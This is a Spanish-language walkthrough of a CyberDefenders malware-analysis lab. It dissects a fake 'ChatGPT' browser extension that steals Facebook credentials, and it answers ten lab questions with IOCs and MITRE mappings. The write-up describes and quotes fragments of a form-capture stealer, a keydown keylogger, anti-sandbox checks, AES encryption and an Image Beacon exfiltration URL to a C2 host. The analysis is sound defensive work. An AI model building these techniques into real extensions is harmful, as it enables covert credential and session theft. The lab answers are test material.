Varios empleados notaron comportamiento extraño en sus navegadores después de instalar una extensión llamada "ChatGPT", y el SOC recibió alertas por cuentas comprometidas y fuga de información. Analizamos su código fuente y encontramos un credential stealer con keylogger, exfiltración mediante Image Beacon y controles anti-análisis.

## El caso

Los usuarios reportaron comportamiento inusual tras instalar la extensión. El objetivo fue analizar sus componentes, identificar los mecanismos de robo de datos, la exfiltración encubierta y las técnicas anti-análisis. El laboratorio entrega los archivos fuente de la extensión (`.js`, `.json`, `.html`, `.gif`) para análisis estático.

- **Plataforma:** CyberDefenders (Blue Team Lab, categoría Malware Analysis)
- **Categoría:** Malware Analysis
- **Herramientas:** ExtAnalysis, CRX Viewer, CyberChef
- **Tácticas:** Credential Access | Collection | Command and Control | Exfiltration

## La investigación

### Preparar los archivos para el análisis

Antes de empezar, empaquetamos los archivos de la extensión en un `.crx` para poder subirlos a ExtAnalysis y CRXViewer.

![Archivos fuente de la extensión entregados por el laboratorio](https://github.com/user-attachments/assets/b8d9b81c-9c9c-4440-abc4-6e4eaeeea091 "Archivos fuente de la extensión")

```bash
zip -r extension.crx app.js crypto.js loader.js manifest.json ui.html IMG.gif
```

### Primeras señales de alerta en el manifest.json

Antes de responder las preguntas del laboratorio, leímos el `manifest.json`. Ya en crudo expone varias red flags: script en background con persistencia, permisos sobre todas las URLs, lectura de formularios y una versión de manifest obsoleta.

![Contenido del manifest.json de la extensión](https://github.com/user-attachments/assets/de5da17e-2d2b-42f9-a2fd-48429ae7a2eb "El manifest.json de la extensión")

La metadata ya delata la impersonación:

| Campo | Valor | Observación |
|-------|-------|-------------|
| name | "ChatGPT" | Impersonación de marca legítima (OpenAI) |
| version | "1.0" | Sin historial de versiones, nueva o reciente |
| manifest_version | 2 | Versión legacy (MV3 es el estándar actual) |
| description | "An AI-powered assistant" | Descripción genérica para aparentar legitimidad |

Los permisos declarados son todavía más reveladores:

| Permiso | Capacidad | Nivel de riesgo |
|---------|-----------|-----------------|
| tabs | Ver URLs y títulos de todas las pestañas abiertas | Medio |
| http://*/* | Acceso completo a toda web HTTP | Crítico |
| https://*/* | Acceso completo a toda web HTTPS | Crítico |
| storage | Persistir datos localmente en el navegador | Medio |
| webRequest | Interceptar y monitorear todas las peticiones de red | Crítico |
| webRequestBlocking | Modificar o bloquear peticiones en tiempo real | Crítico |
| cookies | Leer, escribir y robar cookies de cualquier sitio | Crítico |

> La combinación `webRequestBlocking + cookies + <all_urls>` habilita un ataque Man-in-the-Browser completo: permite interceptar credenciales, secuestrar sesiones y modificar respuestas del servidor antes de que lleguen al usuario.

El background script (`system/loader.js`) corre de forma permanente desde el inicio del navegador:

```json
"background": {
    "scripts": ["system/loader.js"],
    "persistent": true
}
```

Corre permanentemente (`persistent: true`) y el path `system/` intenta aparentar un componente legítimo del sistema operativo. Es el componente de carga del payload principal, así que lo marcamos como el primer archivo a analizar en profundidad.

El content script (`core/app.js`) se inyecta en todas las páginas:

```json
"content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["core/app.js"]
}]
```

Se inyecta en absolutamente todas las páginas web que visita el usuario. Tiene acceso directo al DOM y puede leer formularios, inputs y contraseñas. La directiva `<all_urls>` elimina toda restricción de dominio y cubre banking, email, redes sociales, etc.

### Cómo se ocultan las URLs objetivo

**Q1.** Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?

En `app.js` identificamos una URL objetivo encodeada en Base64, reconocible por los caracteres `==` al final de la cadena. Al decodificarla en CyberChef confirmamos que se trata de `www.facebook.com`. La extensión implementa un listener orientado específicamente a ese dominio para interceptar la actividad del usuario.

![Cadena Base64 en app.js decodificada en CyberChef](https://github.com/user-attachments/assets/20491f03-e5bc-41d6-a738-85924734e131 "URL objetivo en Base64 dentro de app.js")

> **Respuesta:** `Base64`

### El sitio bajo vigilancia

**Q2.** Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?

Es el resultado directo de la decodificación anterior. La URL hardcodeada en `app.js` corresponde a Facebook, lo que confirma que la extensión fue diseñada para interceptar credenciales y sesiones de usuarios de esa plataforma.

![Dominio de Facebook hardcodeado en el código de app.js](https://github.com/user-attachments/assets/37539576-f4a7-40c1-a385-c637186a8b47 "El dominio objetivo hardcodeado")

> **Respuesta:** `www.facebook.com`

### Exfiltración con un Image Beacon

**Q3.** Which type of HTML element is utilized by the extension to send stolen data?

Siguiendo con `app.js`, identificamos una técnica conocida como Image Beacon: los datos salen de forma encubierta a través de imágenes invisibles para el usuario. El flujo es el siguiente:

1. Se crea un elemento `<img>` invisible en el DOM.
2. Al asignar `img.src`, el navegador realiza automáticamente `GET https://Mo.Elshaheedy.com/collect?data=[credenciales_cifradas_AES]`.
3. El servidor C2 recibe las credenciales en el query string de la request.
4. Responde con `204 No Content` o una imagen 1x1px transparente.
5. El usuario no percibe ninguna actividad anómala en ningún momento.

![Código de app.js que crea el elemento de imagen para exfiltrar datos](https://github.com/user-attachments/assets/47a4d8f2-82df-43c4-acbd-cba0a373eb79 "Image Beacon en app.js")

> **Respuesta:** `<img>`

### Controles anti-análisis en loader.js

**Q4.** What is the first specific condition in the code that triggers the extension to deactivate itself?

En `loader.js` encontramos dos funciones principales: anti-análisis y carga dinámica del payload. El código evalúa dos condiciones secuenciales para detectar sandboxes o análisis automatizado.

La primera es `navigator.plugins.length === 0`. Verifica si el navegador tiene cero plugins instalados. Los entornos de análisis automatizado, las máquinas virtuales y los sandboxes suelen no tener plugins registrados, y entonces la extensión se desactiva en silencio para no ser detectada.

La segunda es `/HeadlessChrome/.test(navigator.userAgent)`. Busca la string `"HeadlessChrome"` en el User-Agent. Chrome en modo headless, usado en sandboxes y pipelines de análisis automatizado, la incluye de forma característica, lo que permite al malware identificar y evadir esos entornos.

Además, este script carga dinámicamente el payload principal `app.js` una vez superados los controles.

![Condiciones anti-análisis dentro de loader.js](https://github.com/user-attachments/assets/16f2b2f8-d77a-4235-8e9b-132baa8ad4ef "Checks anti-sandbox en loader.js")

> **Respuesta:** `navigator.plugins.length === 0`

### El evento que captura los formularios

**Q5.** Which event does the extension capture to track user input submitted through forms?

De vuelta en `app.js`, revisamos el módulo de credential stealer. Registra un event listener sobre el evento `submit` de los formularios, que se activa cuando el usuario envía uno. El listener captura los campos `username`, `email` y `password` solo si contienen datos, y luego los encripta y los transmite al servidor C2.

![Listener del evento submit en app.js](https://github.com/user-attachments/assets/a0482995-0dbd-4510-94b5-770ba00bfa94 "Listener submit del credential stealer")

> **Respuesta:** `submit`

### Un keylogger en pocas líneas

**Q6.** Which API or method does the extension use to capture and monitor user keystrokes?

En `app.js` hay un módulo de keylogger breve pero muy efectivo. Registra un event listener a nivel de documento completo sobre el evento `keydown`. Captura cada tecla presionada sin importar el campo o el contexto, por lo que también cubre inputs fuera de los formularios tradicionales.

![Event listener keydown del keylogger en app.js](https://github.com/user-attachments/assets/5b0a805e-0e3c-4386-8c1d-9d94db25cf20 "Keylogger basado en keydown")

> **Respuesta:** `keydown`

### El dominio del servidor C2

**Q7.** What is the domain where the extension transmits the exfiltrated data?

Durante el análisis del Image Beacon en `app.js` vimos en el código la URL completa del servidor C2 al que se envían las credenciales y la información robada mediante requests GET encubiertas.

![URL del servidor C2 en el código de app.js](https://github.com/user-attachments/assets/3c8cd8a1-3cad-450d-ae8c-4e48e5377425 "Dominio C2 de exfiltración")

> **Respuesta:** `mo.elshaheedy.com`

### La función que orquesta el robo

**Q8.** Which function in the code is used to exfiltrate user credentials, including the username and password?

En `app.js` identificamos la función que orquesta todo el proceso de exfiltración. Construye un objeto `.JSON` con los campos `user`, `pass` y `site`, los encripta con AES y los transmite al canal C2 mediante el Image Beacon.

![Definición de la función de exfiltración en app.js](https://github.com/user-attachments/assets/7a72845f-873b-4277-91eb-84ed33409ac1 "Función de exfiltración de credenciales")

> **Respuesta:** `exfiltrateCredentials(username, password)`

### Cifrado antes de salir

**Q9.** Which encryption algorithm is applied to secure the data before sending?

En `app.js` localizamos la función de cifrado que procesa el payload antes de la exfiltración. Toma el objeto `.JSON` con usuario, contraseña y sitio web y lo cifra con AES-CBC, usando un vector de inicialización (IV) generado aleatoriamente para que cada paquete sea único e irrepetible. Por último lo convierte a Base64 antes de enviarlo al canal C2. Cifrado simétrico, IV aleatorio y encoding juntos dificultan mucho la detección por inspección de tráfico.

![Función de cifrado AES-CBC con IV aleatorio en app.js](https://github.com/user-attachments/assets/a5aee07c-74b8-421d-9bc7-adc16fe84315 "Cifrado AES-CBC del payload")

> **Respuesta:** `AES`

### El permiso que habilita el robo de sesiones

**Q10.** What does the extension access to store or manipulate session-related data and authentication information?

Volvimos al `manifest.json`. Entre los permisos declarados figura el acceso explícito a las cookies del navegador. Las cookies de sesión son un objetivo de alto valor porque permiten secuestrar sesiones autenticadas sin conocer las credenciales. Con ese permiso, la extensión puede leer, modificar y exfiltrar cookies de sesión de cualquier dominio visitado.

![Permiso de cookies declarado en el manifest.json](https://github.com/user-attachments/assets/8e4a600b-636f-498a-bbcd-af784e3a3b18 "Permiso cookies en el manifest")

> **Respuesta:** `cookies`

## Reconstrucción del ataque

1. **Reconocimiento de la extensión.** El `manifest.json` muestra MV2, background persistente y `<all_urls>`. Los permisos críticos son `webRequestBlocking`, `cookies` y `storage`. Hay red flags inmediatas: impersonación de OpenAI y versión legacy.
2. **Componentes maliciosos.** `loader.js` hace anti-análisis y carga dinámica, con dos checks: `navigator.plugins.length === 0` y `/HeadlessChrome/.test(navigator.userAgent)`. `app.js` contiene el credential stealer, el keylogger y el Image Beacon. Su objetivo es `www.facebook.com`, codificado en Base64. Los eventos son `submit` (formularios) y `keydown` (keylogger). La exfiltración va por `exfiltrateCredentials()`, AES-CBC y `img.src` hacia el C2.
3. **Infraestructura C2.** El dominio es `mo.elshaheedy.com`. El método es un Image Beacon, un GET desde un `<img>` invisible. El endpoint es `/collect?data=[AES-CBC+Base64 payload]` y el payload es un JSON con `{user, pass, site}`.
4. **Threat intelligence.** La evasión de análisis es anti-VM (check de plugins y HeadlessChrome). El cifrado es AES-CBC con IV aleatorio y Base64. El objetivo específico son las credenciales de sesión de Facebook.

## MITRE ATT&CK

| Táctica | Técnica | ID | Evidencia |
|---------|---------|----|-----------|
| Credential Access | Input Capture: Web Portal Capture | T1056.003 | Event listener `submit` captura credenciales de formularios |
| Collection | Input Capture: Keylogging | T1056.001 | Event listener `keydown` registra todas las teclas presionadas |
| Defense Evasion | Virtualization/Sandbox Evasion | T1497 | Checks `navigator.plugins` y `HeadlessChrome` en loader.js |
| Defense Evasion | Obfuscated Files or Information | T1027 | URLs target encodeadas en Base64 |
| Command and Control | Web Service | T1102 | Exfiltración via Image Beacon a mo.elshaheedy.com |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Credenciales AES+Base64 enviadas via img.src GET request |
| Credential Access | Steal Web Session Cookie | T1539 | Permiso `cookies` para secuestro de sesiones activas |

## Indicadores de compromiso

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Dominio | `mo.elshaheedy.com` | Servidor C2 de exfiltración (en el código aparece como `Mo.Elshaheedy.com`) |
| URL | `https://Mo.Elshaheedy.com/collect?data=[credenciales_cifradas_AES]` | GET del Image Beacon con las credenciales cifradas |
| Dominio | `www.facebook.com` | Sitio objetivo, codificado en Base64 en app.js |
| Archivo | `system/loader.js` | Background script con anti-análisis y carga dinámica |
| Archivo | `core/app.js` | Payload principal: stealer, keylogger y Image Beacon |
| Función | `exfiltrateCredentials(username, password)` | Orquesta la exfiltración de credenciales |

## Herramientas

- **ExtAnalysis:** análisis automático de la extensión de Chrome.
- **CRX Viewer:** inspección de los archivos fuente.
- **CyberChef:** decodificación Base64 de las URLs ofuscadas.

## Lecciones aprendidas

1. **Revisión del manifest.** Auditar siempre los permisos de una extensión antes de instalarla: `webRequestBlocking + cookies + <all_urls>` equivale a un Man-in-the-Browser garantizado.
2. **Image Beacon.** La exfiltración vía `<img>` es difícil de detectar para firewalls tradicionales, porque se disfraza de tráfico web legítimo.
3. **Detección de anti-análisis.** Encontrar checks de `navigator.plugins` y `HeadlessChrome` en scripts de extensiones es un indicador directo de comportamiento malicioso.
